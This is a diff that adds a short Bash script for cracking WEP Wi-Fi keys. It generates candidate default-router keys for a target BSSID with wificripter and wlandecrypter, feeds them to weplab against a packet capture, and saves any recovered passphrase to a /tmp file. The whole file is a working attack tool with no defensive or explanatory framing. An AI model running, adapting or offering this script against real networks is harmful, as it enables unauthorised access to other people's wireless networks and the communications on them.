@@ -1,0 +1,40 @@
+rm /tmp/$1* >/dev/null 2>/dev/null
+
+wificripter -wlan $1 $2 /tmp/$1_1.txt >/dev/null 2>/dev/null
+wlandecrypter $1 $2 >/tmp/$1_2.txt 2>/dev/null 
+
+cat /tmp/$1_1.txt /tmp/$1_2.txt 2>/dev/null | sort | uniq >/tmp/$1.txt 2>/dev/null
+
+[ ! -e /tmp/$1 ] && touch /tmp/$1.txt
+num_claves=$(cat /tmp/$1.txt | wc -l)
+if [ $num_claves -lt 1000 ] ; then
+	rm /tmp/$1*
+	echo "0">/tmp/$1.pqt
+	echo "ERROR 1">/tmp/$1.key
+	exit
+fi
+
+cat /tmp/$1.txt 2>/dev/null | weplab --key 128 -y --bssid $1 "$3" >/tmp/$1.weplab
+
+num_paquetes=$(cat /tmp/$1.weplab | grep "valid packets read:" | head -1 | cut -d":" -f2 | cut -d" " -f2)
+[ "$num_paquetes" == "" ] && num_paquetes=0
+clave=$(cat /tmp/$1.weplab | grep "Passphrase was -->" | cut -d">" -f2 | cut -d" " -f2)
+
+if [ "$clave" == "" ] ; then
+	if [ $num_paquetes -lt 3 ] ; then
+		rm /tmp/$1*
+		echo "$num_paquetes">/tmp/$1.pqt
+		echo "ERROR 2">/tmp/$1.key
+		exit
+	else
+		rm /tmp/$1*
+		echo "$num_paquetes">/tmp/$1.pqt
+		echo "ERROR 3">/tmp/$1.key
+		exit
+	fi
+else
+	rm /tmp/$1*
+	echo "$clave">/tmp/$1.key
+	exit
+fi
+
